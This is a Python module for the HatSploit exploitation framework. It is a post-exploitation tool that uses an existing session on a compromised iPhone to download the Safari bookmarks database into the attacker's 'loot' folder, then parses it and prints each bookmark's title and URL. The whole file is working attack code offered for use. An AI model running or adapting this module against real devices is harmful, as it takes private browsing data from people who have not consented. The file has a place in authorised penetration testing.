#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module
from hatsploit.lib.config import Config

from hatsploit.utils.session import SessionTools
from hatsploit.utils.db import DBTools


class HatSploitModule(Module, SessionTools, DBTools):
    config = Config()

    details = {
        'Name': "Obtain Safari bookmarks",
        'Module': "post/iphoneos/shell/safari_bookmarks",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer'
        ],
        'Description': "Get iPhoneOS Safari bookmarks database and parse it.",
        'Comments': [
            ''
        ],
        'Platform': "iphoneos",
        'Rank': "medium"
    }

    options = {
        'SESSION': {
            'Description': "Session to run on.",
            'Value': None,
            'Type': "session->[iphoneos,unix,macos]",
            'Required': True
        }
    }

    def run(self):
        session = self.parse_options(self.options)
        session = self.get_session(session)

        if session:
            if session.download(
                '/private/var/mobile/Library/Safari/Bookmarks.db', config.path_config['loot_path']):

                self.print_process("Parsing bookmarks database...")
                try:
                    bookmarks = self.parse_safari_history(config.path_config['loot_path'] + 'Bookmarks.db')
                except Exception:
                    self.print_error("Failed to parse bookmarks database!")
                    return

                headers = ('Title', 'URL')
                bookmarks_data = []

                for item in bookmarks:
                    bookmarks_data.append((item['title'], item['url']))

                if bookmarks_data:
                    self.print_table("Bookmarks", headers, *bookmarks_data)
                else:
                    self.print_warning("No bookmarks available on device.")
